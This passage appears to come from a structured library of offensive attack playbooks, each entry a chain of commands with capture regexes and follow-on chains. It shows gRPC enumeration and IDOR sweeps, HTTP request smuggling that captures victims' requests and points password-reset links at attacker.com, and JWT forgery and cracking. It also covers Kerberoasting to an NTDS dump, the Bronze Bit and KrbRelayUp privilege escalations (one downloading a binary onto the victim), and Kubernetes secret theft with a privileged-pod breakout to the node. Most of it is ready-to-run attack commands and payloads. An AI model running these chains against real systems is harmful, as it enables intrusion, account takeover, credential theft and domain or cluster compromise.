          }
        }
      ],
      "references": [
        {
          "title": "PortSwigger — GraphQL attacks",
          "url": "https://portswigger.net/web-security/graphql"
        },
        {
          "title": "HackTricks — GraphQL",
          "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html"
        }
      ],
      "next_chains": [
        {
          "chain": "nosql-injection",
          "when": "NoSQL injection successful via args",
          "reason": "Pivot to full NoSQL exploitation."
        },
        {
          "chain": "sqli-to-os-shell",
          "when": "SQL injection successful via args",
          "reason": "Full SQLi → OS shell."
        },
        {
          "chain": "jwt-attacks",
          "when": "mutation returns JWT token",
          "reason": "Stolen token → forge stronger ones."
        }
      ]
    },
    {
      "id": "grpc-enumeration",
      "name": "Web — gRPC enumeration + method invocation",
      "description": "gRPC services (HTTP/2 + protobuf) are increasingly exposed in microservices architectures. If reflection is enabled — and on internal services it almost always is — you can list every method and call them ad hoc, often without authentication.\n",
      "tags": [
        "web",
        "grpc",
        "microservices",
        "enumeration"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_host",
          "description": "Host:port of the gRPC service (e.g. api.target.com:443).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "probe_grpc",
          "name": "Confirm host speaks gRPC",
          "inline_command": "grpcurl -insecure '<host>' list\n# If TLS: -insecure if self-signed; drop -insecure for valid CA.\n# If plaintext: add -plaintext\ngrpcurl -plaintext '<host>' list\n",
          "inputs": {
            "host": "${target_host}"
          },
          "notes": "Output: list of services (e.g. `api.UserService`, `api.AdminService`,\n`grpc.reflection.v1alpha.ServerReflection`). Reflection MUST be\nenabled — silent failure otherwise (returns \"server doesn't support\nreflection\").\n"
        },
        {
          "id": "enumerate_methods",
          "name": "Enumerate methods per service",
          "inline_command": "grpcurl -insecure '<host>' list <service>\n# Then inspect each method's IO types:\ngrpcurl -insecure '<host>' describe <service>.<method>\n# And the message schemas they use:\ngrpcurl -insecure '<host>' describe <package>.<MessageName>\n",
          "inputs": {
            "host": "${target_host}"
          },
          "notes": "Examples of high-value method names you almost always find:\n  GetUser, GetUserById, ListUsers, AdminGetUsers\n  ResetPassword, DeleteUser, PromoteToAdmin\n  ExecuteQuery, RunScript, RunCommand (RCE in plain sight)\n  ExportData, ExportSecrets, DumpConfig\n"
        },
        {
          "id": "call_method",
          "name": "Invoke methods directly",
          "inline_command": "# Pass JSON args via stdin / -d:\necho '{\"id\": 1}' | grpcurl -insecure -d @ '<host>' <service>/<method>\n# Or inline:\ngrpcurl -insecure -d '{\"id\": 1}' '<host>' <service>/GetUser\n# With metadata (gRPC's headers — for auth tokens):\ngrpcurl -insecure -H 'authorization: Bearer <jwt>' -d '{\"id\":1}' '<host>' <service>/GetUser\n",
          "inputs": {
            "host": "${target_host}"
          },
          "notes": "Many gRPC services trust internal callers (no auth on internal\nservices). If you can reach the endpoint, you can usually invoke.\n"
        },
        {
          "id": "idor_user_dump",
          "name": "IDOR sweep — iterate IDs",
          "inline_command": "for id in $(seq 1 1000); do\n  grpcurl -insecure -d \"{\\\"id\\\": $id}\" '<host>' api.UserService/GetUser \\\n    | jq -c '{id, email, role}'\ndone\n",
          "inputs": {
            "host": "${target_host}"
          }
        },
        {
          "id": "no_reflection_workaround",
          "name": "Reflection disabled? Hunt for .proto files",
          "inline_command": "# Common locations:\n# - Public mobile-app source: pull APK → strings → look for .proto names.\n# - JS frontend: grep for \"google/protobuf\" imports — gRPC-Web stub.\n# - .well-known/grpc — some apps publish service definitions.\n# Then:\ngrpcurl -insecure -proto api.proto '<host>' <service>/<method>\n",
          "notes": "grpcui is also useful — drop your .proto in and click through methods.\n"
        },
        {
          "id": "bypass_grpc_web",
          "name": "gRPC-Web variant — POST /<service>/<method> with binary body",
          "inline_command": "# Some browsers can't speak HTTP/2 plain gRPC; servers add gRPC-Web\n# proxying. That layer is reachable as plain HTTP/1.1 POST:\ncurl -X POST 'https://<host>/<service>/<method>' \\\n  -H 'Content-Type: application/grpc-web-text' \\\n  -H 'X-User-Agent: grpc-web-javascript/0.1' \\\n  --data-binary 'AAAAAAU<base64 of protobuf payload>'\n"
        }
      ],
      "references": [
        {
          "title": "grpcurl",
          "url": "https://github.com/fullstorydev/grpcurl"
        },
        {
          "title": "HackTricks — gRPC pentesting",
          "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/grpc-web-pentest.html"
        }
      ],
      "next_chains": [
        {
          "chain": "graphql-introspection-injection",
          "when": "sibling API exposes both gRPC + GraphQL",
          "reason": "Same backend often exposes both — attack the easier surface."
        },
        {
          "chain": "jwt-attacks",
          "when": "gRPC auth via JWT in metadata",
          "reason": "Captured token → forge stronger ones."
        }
      ]
    },
    {
      "id": "http-request-smuggling",
      "name": "Web — HTTP request smuggling (CL.TE / TE.CL / TE.TE / H2.CL / H2.TE)",
      "description": "Front-end (CDN / proxy) and back-end disagree on where one HTTP request ends and the next begins. Smuggle a prefix that the back-end treats as belonging to the NEXT user's connection → session theft, header injection, cache poisoning, internal endpoint access.\n",
      "tags": [
        "web",
        "http-smuggling",
        "desync",
        "h2",
        "classic-web"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "target_host",
          "description": "Hostname with the suspected proxy chain.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "discover",
          "name": "Run HTTP Request Smuggler scan in Burp",
          "inline_command": "echo 'Burp → extension HTTP Request Smuggler → right-click target → Launch Smuggle Probe. Reports any of CL.TE / TE.CL / TE.TE / H2.CL / H2.TE detected.'",
          "notes": "Manual probe (CL.TE): two conflicting headers; front-end honors\nContent-Length, back-end honors Transfer-Encoding.\n  POST / HTTP/1.1\n  Host: <host>\n  Transfer-Encoding: chunked\n  Content-Length: 5\n\n  0\n\n  G\n→ back-end leaves `G` in the socket buffer; treated as the start of\nthe next request → that user sees response for \"G...\" prefix.\n"
        },
        {
          "id": "capture_victim_request",
          "name": "Smuggle a prefix that captures the victim's request",
          "inline_command": "# Send via Burp Repeater (raw, with Content-Length disabled in Repeater settings):\ncat <<'EOF' > smuggle.txt\nPOST / HTTP/1.1\nHost: <host>\nTransfer-Encoding: chunked\nContent-Length: 213\n\n0\n\nPOST /log HTTP/1.1\nHost: <host>\nCookie: x=\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 200\n\nx=\nEOF\n# The back-end parses the smuggled POST /log; it consumes 200 bytes\n# of the NEXT victim's actual request and stores them in your /log\n# form param. Hit /log/admin to retrieve the captured data.\n"
        },
        {
          "id": "header_injection_via_smuggling",
          "name": "Inject X-Forwarded-Host into victim's session",
          "inline_command": "# Smuggle a request whose Host header attacker controls; if the\n# origin builds password-reset URLs from Host, the reset email\n# link points at attacker.com:\ncat <<'EOF' >> smuggle.txt\nGET /reset-password?email=victim@target.com HTTP/1.1\nHost: attacker.com\nEOF\n# → password-reset link in email: https://attacker.com/reset?token=...\n"
        },
        {
          "id": "poison_cache_via_smuggling",
          "name": "Combine with cache poisoning",
          "inline_command": "# Smuggle a request that hits a cacheable static path with malicious\n# Host header → response keyed under /static/main.js with attacker content.\n# See chains/cache-deception-poisoning.yaml for the cache primitive.\necho 'Chain into cache-deception-poisoning for the cache abuse.'\n"
        },
        {
          "id": "h2_smuggling",
          "name": "HTTP/2 smuggling (modern hot variant)",
          "inline_command": "# H2.CL: HTTP/2 strips Content-Length validation; back-end speaks HTTP/1.1\n# and trusts the smuggled CL.\n# H2.TE: same for Transfer-Encoding.\n# H2.0: HTTP/2 newline injection — :authority value contains \\r\\n that\n# introduces a header on the down-converted HTTP/1.1 request.\n# Burp Repeater → toggle \"send via HTTP/2\" → enter pseudo-header\n# values like:\n#   :authority: target.com\\r\\nFoo: bar\n",
          "notes": "James Kettle's \"HTTP/2: The Sequel is Always Worse\" (Black Hat 2021)\ncatalogs every variant. Modern Burp builds in detection.\n"
        },
        {
          "id": "confirm_and_weaponize",
          "name": "Confirm desync → measure how much you can smuggle",
          "inline_command": "# Differential test: send 2 versions of the same probe; one with\n# the smuggle padding, one without. Different response time / status\n# = confirmation.\n"
        }
      ],
      "references": [
        {
          "title": "PortSwigger — Request smuggling",
          "url": "https://portswigger.net/web-security/request-smuggling"
        },
        {
          "title": "James Kettle — H2 The Sequel Is Always Worse",
          "url": "https://portswigger.net/research/http2"
        },
        {
          "title": "Smashing the State Machine (race + smuggle hybrid)",
          "url": "https://portswigger.net/research/smashing-the-state-machine"
        }
      ],
      "next_chains": [
        {
          "chain": "cache-deception-poisoning",
          "when": "smuggling lands → poison cache for persistence",
          "reason": "Combine for shared-cache backdoor that affects every user."
        }
      ]
    },
    {
      "id": "jwt-attacks",
      "name": "Web — JWT attacks (none / alg confusion / weak secret)",
      "description": "JSON Web Tokens are a CTF staple for auth bypass. The four common weaknesses: `alg:none` accepted, RS→HS algorithm confusion, weak HMAC secret crackable offline, kid header path traversal.\n",
      "tags": [
        "web",
        "jwt",
        "auth-bypass",
        "crypto"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_url",
          "description": "An endpoint that accepts the JWT (usually in Authorization: Bearer or cookie).",
          "required": true
        },
        {
          "name": "token",
          "description": "A valid (low-priv) JWT to mutate.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "decode",
          "name": "Decode header + payload (no key needed)",
          "inline_command": "echo '<token>' | cut -d. -f1 | base64 -d; echo; echo '<token>' | cut -d. -f2 | base64 -d",
          "inputs": {
            "token": "${token}"
          },
          "notes": "The header tells you `alg` (HS256 / RS256 / none / ES256...) and\noptionally `kid` (key id). The payload tells you what claim you'd\nwant to change (typically `role`, `admin`, `user_id`).\n"
        },
        {
          "id": "alg_none",
          "name": "Try alg=none",
          "inline_command": "# Modify header to {\"alg\":\"none\",\"typ\":\"JWT\"}, payload as desired,\n# signature empty.\npython3 -c '\nimport json, base64\ndef b64(d): return base64.urlsafe_b64encode(json.dumps(d, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nh = b64({\"alg\":\"none\",\"typ\":\"JWT\"})\np = b64({\"sub\":\"admin\",\"role\":\"admin\",\"exp\":9999999999})\nprint(f\"{h}.{p}.\")'\n",
          "notes": "Bad JWT libraries accept `none` as valid (signature ignored). Always\nworth a try — 5 second test.\n"
        },
        {
          "id": "rs_to_hs_confusion",
          "name": "RS256 → HS256 confusion (sign with the public key)",
          "inline_command": "# Get the server's public key (often at /jwks.json, /.well-known/jwks,\n# /api/v1/auth/key, or embedded in a JS bundle).\ncurl '<url>/.well-known/jwks.json' -o jwks.json\n# Convert JWK → PEM with jwt_tool (or jwk2pem)\npython3 -m jwt_tool '<token>' -X k -pk pub.pem\n",
          "inputs": {
            "url": "${target_url}",
            "token": "${token}"
          },
          "notes": "Bug: server's verify call uses the public key as a SYMMETRIC HMAC\nsecret because it's lazy about typing. Attacker signs with HS256\nusing the public key (which they have) and the server validates.\n"
        },
        {
          "id": "weak_secret",
          "name": "Weak HS256 secret — crack offline",
          "inline_command": "echo '<token>' > token.txt\nhashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt\n# or john:\njohn --wordlist=/usr/share/wordlists/rockyou.txt token.txt\n",
          "inputs": {
            "token": "${token}"
          },
          "notes": "If alg is HS256/384/512, the entire token's signature is HMAC(secret,\nheader.payload). hashcat -m 16500 / john's hsec256 cracks it in\nseconds against rockyou for weak secrets (\"secret\", \"key\", \"jwt\", etc.).\n",
          "capture": [
            {
              "var": "jwt_secret",
              "regex": "^([^:]+):(\\S+)$",
              "match": "first",
              "groups": {
                "hash": 1,
                "secret": 2
              }
            }
          ]
        },
        {
          "id": "kid_path_traversal",
          "name": "kid header path traversal / SQLi",
          "inline_command": "# Some servers do: read_key(jwt.kid) without sanitization.\n# Try: kid = ../../../../dev/null, sign with empty key\n# Or: kid = ' UNION SELECT 'attacker-controlled-secret' --\n",
          "notes": "Rare but devastating. Tools: jwt_tool's --exploit (covers everything\nabove automatically). Always run `python3 jwt_tool.py <token> -M at`\nfor full attack tree.\n"
        },
        {
          "id": "forge_admin_token",
          "name": "Forge the high-priv token (once you have a working method)",
          "inline_command": "python3 -c '\nimport jwt\ntok = jwt.encode({\"sub\":\"admin\",\"role\":\"admin\",\"exp\":9999999999}, \"<secret>\", algorithm=\"HS256\")\nprint(tok)'\n",
          "inputs": {
            "secret": "${jwt_secret}"
          }
        }
      ],
      "references": [
        {
          "title": "PortSwigger — JWT attacks",
          "url": "https://portswigger.net/web-security/jwt"
        },
        {
          "title": "jwt_tool",
          "url": "https://github.com/ticarpi/jwt_tool"
        }
      ]
    },
    {
      "id": "kerberoast-chain",
      "name": "Kerberoast → Crack → Lateral Move",
      "description": "With one valid domain credential, request TGS tickets for every account that has a ServicePrincipalName set, crack them offline, then reuse the recovered service-account password to dump secrets from the DC.\n",
      "tags": [
        "kerberos",
        "kerberoast",
        "credential-attack",
        "lateral-movement",
        "active-directory"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "roast",
          "name": "Request TGS tickets for SPN accounts",
          "command_ref": "kerberoasting",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "tgs_hashes",
              "regex": "\\$krb5tgs\\$.+",
              "match": "all"
            },
            {
              "var": "kerberoastable_users",
              "regex": "\\$krb5tgs\\$[0-9]+\\*([A-Za-z0-9._$-]+)\\$",
              "match": "all"
            }
          ]
        },
        {
          "id": "crack",
          "name": "Crack TGS hashes offline",
          "command_ref": "Cracking-Kerberoasting-hashes",
          "requires": [
            "tgs_hashes"
          ],
          "capture": [
            {
              "var": "cracked_service_creds",
              "regex": "^\\$krb5tgs\\$[^:]+:(.+)$",
              "match": "all",
              "transform": "trim"
            }
          ]
        },
        {
          "id": "dump_secrets",
          "name": "Dump NTDS via the service account",
          "notes": "Many service accounts (especially SQL/IIS principals) are members of\nprivileged groups. If the cracked principal can DCSync, secretsdump\npulls every NTLM hash from the DC.\n",
          "command_ref": "secretsdump",
          "requires": [
            "cracked_service_creds"
          ]
        }
      ],
      "references": [
        {
          "title": "Kerberoasting — The Hacker Recipes",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast"
        },
        {
          "title": "Impacket secretsdump",
          "url": "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py"
        }
      ],
      "next_chains": [
        {
          "chain": "pth-lateral-spread",
          "when": "cracked_service_creds captured",
          "reason": "Service accounts often live across many hosts."
        },
        {
          "chain": "mssql-impersonation-chain",
          "when": "cracked MSSQLSvc",
          "reason": "A SQL service account → instant MSSQL pivot."
        }
      ]
    },
    {
      "id": "kerberos-bronze-bit",
      "name": "AD — Bronze Bit (CVE-2020-17049) bypass forwardable check",
      "description": "Constrained delegation without protocol transition normally refuses to emit a forwardable TGS for an unforwardable user. The Bronze Bit flips the forwardable flag at S4U2self time, letting you S4U2proxy as protected users (Domain Admins) too.\n",
      "tags": [
        "kerberos",
        "bronze-bit",
        "cve-2020-17049",
        "delegation",
        "priv-esc"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "delegating_principal",
          "description": "Computer/user with constrained delegation set.",
          "required": true
        },
        {
          "name": "delegating_aes_key",
          "description": "AES256 key OR NT hash of the delegating principal.",
          "required": true
        },
        {
          "name": "target_spn",
          "description": "SPN to ride into (e.g. cifs/dc01.corp.local).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_constrained",
          "name": "Confirm the principal has constrained delegation",
          "command_ref": "nxc-ldap-find-delegation",
          "inputs": {
            "dc-ip": "${dc_ip}"
          },
          "notes": "Bronze Bit requires `TRUSTED_TO_AUTH_FOR_DELEGATION` to be FALSE (no\nprotocol transition). If TRUE, just use the standard\nconstrained-delegation-s4u chain instead.\n"
        },
        {
          "id": "confirm_target_protected",
          "name": "Confirm the impersonation target is in 'Protected Users' / Sensitive",
          "inline_command": "nxc ldap <dc-ip> -u <user> -p <password> --query \\\n  \"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))\" \\\n  \"sAMAccountName,distinguishedName\"\n",
          "inputs": {
            "dc-ip": "${dc_ip}"
          },
          "notes": "`0x100000` = ACCOUNTDISABLE? No — that flag means NOT_DELEGATED. If\nAdministrator has it, S4U normally fails. Bronze Bit bypasses that.\n"
        },
        {
          "id": "detonate_bronze_bit",
          "name": "Run S4U2self+S4U2proxy with -force-forwardable",
          "inline_command": "impacket-getST \\\n  -spn '<target_spn>' \\\n  -impersonate Administrator \\\n  -dc-ip <dc-ip> \\\n  -force-forwardable \\\n  '<domain>/<principal>:<aes_or_nt>'\n",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "domain": "${domain}",
            "principal": "${delegating_principal}",
            "aes_or_nt": "${delegating_aes_key}",
            "target_spn": "${target_spn}"
          },
          "notes": "Requires patched impacket (`getST.py` with -force-forwardable). The\nticket file ends up at `<user>@<spn>.ccache`. PATCH STATUS: KB4598347\n(Feb 2021) fixed it — only works on unpatched DCs (still very common\non HTB/labs).\n",
          "capture": [
            {
              "var": "bronze_ccache",
              "regex": "Saving ticket in (\\S+\\.ccache)",
              "match": "first"
            }
          ]
        },
        {
          "id": "use_ticket",
          "name": "Use the forged ticket",
          "inline_command": "export KRB5CCNAME=<ccache>\nklist\nimpacket-secretsdump -k -no-pass <target_host>\n",
          "inputs": {
            "ccache": "${bronze_ccache}"
          }
        }
      ],
      "references": [
        {
          "title": "Bronze Bit (Netspi)",
          "url": "https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/"
        },
        {
          "title": "Impacket -force-forwardable",
          "url": "https://github.com/fortra/impacket/pull/1101"
        }
      ],
      "next_chains": [
        {
          "chain": "dpapi-secrets-extraction",
          "when": "forged admin ticket on a host",
          "reason": "Loot DPAPI on the now-owned target."
        },
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "target was DC",
          "reason": "Domain compromise → Golden Ticket."
        }
      ]
    },
    {
      "id": "krbrelayup-cve-2022-26923",
      "name": "Windows local — KrbRelayUp (local→SYSTEM via RBCD)",
      "description": "Local Windows user → NT AUTHORITY\\SYSTEM via Kerberos relay against the host's own LDAP service, leveraging MachineAccountQuota=10 to create a computer account and write RBCD on the local machine, then S4U2self to SYSTEM. Works on default-config domain-joined Windows.\n",
      "tags": [
        "windows",
        "priv-esc",
        "krbrelayup",
        "rbcd",
        "kerberos",
        "classic-windows"
      ],
      "difficulty": "medium",
      "inputs": [],
      "steps": [
        {
          "id": "confirm_domain_joined",
          "name": "Confirm host is domain-joined + MAQ > 0",
          "inline_command": "whoami /upn         # Should be user@domain\nnet config workstation | findstr /i domain\n# MAQ:\n$domain = (Get-WmiObject Win32_ComputerSystem).Domain\nGet-ADObject -Filter \"*\" -Properties ms-DS-MachineAccountQuota -Server $domain | Select-Object -First 1 | fl\n",
          "notes": "Any value > 0 works. Default = 10 on every install since Win2000.\n"
        },
        {
          "id": "build_or_grab",
          "name": "Get the KrbRelayUp binary",
          "inline_command": "# PowerShell on the victim:\niwr https://github.com/Dec0ne/KrbRelayUp/releases/latest/download/KrbRelayUp.exe -OutFile C:\\Windows\\Temp\\kru.exe\n"
        },
        {
          "id": "full_chain_attack",
          "name": "Run the full chain (creates computer + writes RBCD + S4U2self)",
          "inline_command": "C:\\Windows\\Temp\\kru.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName ATTACKER$ -ComputerPassword 'P@ssw0rd!'\nC:\\Windows\\Temp\\kru.exe spawn -m rbcd -d <domain> -dc <dc-fqdn> -cn ATTACKER$ -cp 'P@ssw0rd!'\n",
          "notes": "KrbRelayUp handles the whole dance:\n  1. Create ATTACKER$ via LDAP (MAQ allows it)\n  2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on the local\n     machine, granting ATTACKER$ delegation rights\n  3. S4U2self as Administrator to the local CIFS service\n  4. Spawn cmd.exe as SYSTEM\nIf you see \"RPC Authentication Error\" — the host disabled LDAP\nsigning+channel binding (good — exploitable). If patched (KB5005413\nMay 2022), use the `shadowcred` mode instead.\n"
        },
        {
          "id": "shadow_cred_variant",
          "name": "Alternative: shadow-credential variant (patched-host friendly)",
          "inline_command": "C:\\Windows\\Temp\\kru.exe spawn -m shadowcred -d <domain> -dc <dc-fqdn>"
        },
        {
          "id": "confirm_system",
          "name": "Confirm SYSTEM",
          "inline_command": "whoami"
        }
      ],
      "references": [
        {
          "title": "KrbRelayUp",
          "url": "https://github.com/Dec0ne/KrbRelayUp"
        },
        {
          "title": "Mor Davidovich's research",
          "url": "https://www.crowdstrike.com/blog/krbrelayup-vulnerability-analysis/"
        }
      ],
      "next_chains": [
        {
          "chain": "dpapi-secrets-extraction",
          "reason": "SYSTEM → loot DPAPI for every user that logged in."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "NTLM hashes captured locally",
          "reason": "Spread the harvested identities."
        }
      ]
    },
    {
      "id": "kubernetes-pod-escape",
      "name": "Cloud — Kubernetes pod token → API → node breakout",
      "description": "RCE inside a pod gives you the pod's service-account token at /var/run/secrets/kubernetes.io/serviceaccount/token. Hit the API server, list permissions, escalate to a privileged namespace or break out to the host node.\n",
      "tags": [
        "cloud",
        "kubernetes",
        "container-escape",
        "post-exploitation"
      ],
      "difficulty": "hard",
      "inputs": [],
      "steps": [
        {
          "id": "harvest_token",
          "name": "Extract the pod's service-account token",
          "inline_command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token\ncat /var/run/secrets/kubernetes.io/serviceaccount/namespace\ncat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\nenv | grep KUBERNETES\n",
          "capture": [
            {
              "var": "sa_token",
              "regex": "^(eyJ[A-Za-z0-9._-]+)$",
              "match": "first"
            },
            {
              "var": "namespace",
              "regex": "^([a-z][a-z0-9-]+)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "api_url",
          "name": "Find the API server",
          "inline_command": "echo \"https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\"",
          "notes": "Usually 10.96.0.1:443 inside the pod network. Reachable from any\npod by default unless NetworkPolicy says otherwise.\n"
        },
        {
          "id": "list_permissions",
          "name": "What can this token do? (SelfSubjectAccessReview)",
          "inline_command": "curl -sk \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -X POST \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"<ns>\",\"verb\":\"create\",\"resource\":\"pods\"}}}' \\\n  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews\n",
          "notes": "Or use the kubectl auth plugin if you can drop a static binary:\n  kubectl auth can-i --list -n <ns>\nLook specifically for: create pods, get/list secrets, create\nrolebindings, escalate, impersonate.\n"
        },
        {
          "id": "pillage_secrets",
          "name": "If you can read secrets — pillage them",
          "inline_command": "curl -sk -H \"Authorization: Bearer $TOKEN\" \\\n  https://kubernetes.default.svc/api/v1/namespaces/<ns>/secrets\n"
        },
        {
          "id": "privileged_pod_breakout",
          "name": "Create a privileged pod that mounts host filesystem → root on node",
          "inline_command": "cat > /tmp/privpod.yaml <<'EOF'\napiVersion: v1\nkind: Pod\nmetadata: { name: pwned, namespace: <ns> }\nspec:\n  hostPID: true\n  containers:\n  - name: pwn\n    image: alpine\n    command: [\"/bin/sh\",\"-c\",\"nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh\"]\n    securityContext: { privileged: true }\n    volumeMounts: [{ name: host, mountPath: /host }]\n  volumes: [{ name: host, hostPath: { path: / } }]\nEOF\nkubectl --token=$TOKEN apply -f /tmp/privpod.yaml -n <ns>\nkubectl --token=$TOKEN exec -it pwned -n <ns> -- sh\n",
          "notes": "You're now root on the underlying node. If it's a control-plane\nnode → cluster takeover. If it's just a worker → use the kubelet\nkubeconfig at /etc/kubernetes/kubelet.conf to talk to the API as\nthat node (often has wider access).\n"
        },
        {
          "id": "rbac_escalate",
          "name": "If you have `escalate` permission — create a cluster-admin binding",
          "inline_command": "cat > /tmp/binding.yaml <<'EOF'\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata: { name: pwned-admin }\nroleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }\nsubjects: [{ kind: ServiceAccount, name: default, namespace: <ns> }]\nEOF\nkubectl --token=$TOKEN apply -f /tmp/binding.yaml\n"
        }
      ],
      "references": [
        {
          "title": "Kubernetes security cheatsheet",
          "url": "https://book.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/index.html"
        },
        {
          "title": "Bishop Fox — Kubernetes attack matrix",
          "url": "https://www.bishopfox.com/blog/kubernetes-pod-escape-using-log-mounts"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "broke out to a node shell",
          "reason": "Stabilize before pivoting further."
        },
        {
          "chain": "linux-priv-esc-recon",
          "when": "on the node now",
          "reason": "Standard Linux PE recon on the worker / control-plane node."
        }
      ]
    },
    {
      "id": "ldap-anonymous-enum",
      "name": "Recon — LDAP anonymous / authenticated enum",
      "description": "Walk the directory: domain name, naming contexts, computers, users, privileged groups, kerberoastable & AS-REP-roastable principals. With even one valid credential, LDAP gives you the topology of the domain.\n",
      "tags": [
        "recon",
        "ldap",
        "active-directory",
        "enumeration"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "user",
          "description": "Any valid domain user (or '' for anonymous bind).",
          "source": "target_context.user"
        },
        {
          "name": "password",
          "source": "target_context.password"
        }
      ],
      "steps": [
        {
          "id": "dc_basic",
          "name": "DC fingerprint + naming context",
          "command_ref": "nxc-ldap-dc-list",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "domain",
              "regex": "^[A-Z]+\\s+\\S+\\s+\\d+\\s+\\S+\\s+\\[\\*\\]\\s+([A-Za-z0-9.-]+)",
              "match": "first"
            }
          ]
        },
        {
          "id": "asreproastable",
          "name": "AS-REP-roastable users",
          "command_ref": "nxc-ldap-asreproasting",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}",
            "output.txt": "asrep.hashes"
          },
          "capture": [
            {
              "var": "asrep_hashes",
              "regex": "\\$krb5asrep\\$.+",
              "match": "all"
            }
          ],
          "notes": "Hand off straight to the asrep-to-shell chain if any hashes pop.\n"
        },
        {
          "id": "kerberoastable",
          "name": "Kerberoastable accounts",
          "command_ref": "nxc-ldap-kerberoasting",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}",
            "output.txt": "tgs.hashes"
          },
          "capture": [
            {
              "var": "tgs_hashes",
              "regex": "\\$krb5tgs\\$.+",
              "match": "all"
            }
          ]
        },
        {
          "id": "delegation",
          "name": "Find delegation (unconstrained / RBCD candidates)",
          "command_ref": "nxc-ldap-find-delegation",
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Unconstrained → printer-bug chain. Constrained → S4U2proxy abuse.\nRBCD-writable → RBCD takeover chain.\n"
        },
        {
          "id": "bloodhound_collect",
          "name": "BloodHound data collection",
          "command_ref": "bloodhound-ce-python",
          "requires": [
            "domain"
          ],
          "inputs": {
            "dc-ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}",
            "domain": "${domain}"
          },
          "notes": "Ingest the resulting zips into BloodHound CE and run the built-in\npaths: \"Shortest paths to Domain Admin\", \"Find AS-REP-roastable users\",\n\"Find computers with unconstrained delegation\".\n"
        }
      ],
      "references": [
        {
          "title": "The Hacker Recipes — AD",
          "url": "https://www.thehacker.recipes/ad/movement/"
        },
        {
          "title": "BloodHound queries",
          "url": "https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart"
        }
      ],
      "next_chains": [
        {
          "chain": "asrep-to-shell",
          "when": "asrep_hashes captured",
          "reason": "AS-REP-roastable accounts found."
        },
        {
          "chain": "kerberoast-chain",
          "when": "tgs_hashes captured",
          "reason": "Kerberoastable SPNs found."
        },
        {
          "chain": "password-spray",
          "when": "user_list populated",
          "reason": "Try the obvious passwords against the user list."
        },
        {
          "chain": "shadow-credentials",
          "when": "BloodHound shows GenericWrite edge",
          "reason": "Silent takeover path for write-access primitives."
        }
      ]
    },
    {
      "id": "ldap-relay-shadow-cred",
      "name": "AD — LDAPS relay + Shadow Credentials (no signing required)",
      "description": "LDAP signing isn't enforced by default. Relay coerced auth to LDAPS, write a KeyCredentialLink to a high-value target, then PKINIT as that target. Single-shot domain takeover when ADCS is reachable.\n",
      "tags": [
        "ntlm-relay",
        "ldap",
        "shadow-credentials",
        "adcs",
        "priv-esc"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "target_principal",
          "description": "User/computer to take over (defaults to a DC for full takeover).",
          "required": true
        },
        {
          "name": "listener_ip",
          "description": "Your attacker IP.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "ldap_signing_check",
          "name": "Check LDAP signing requirement",
          "inline_command": "nxc ldap <dc-ip> -u '' -p '' -M ldap-checker",
          "inputs": {
            "dc-ip": "${dc_ip}"
          },
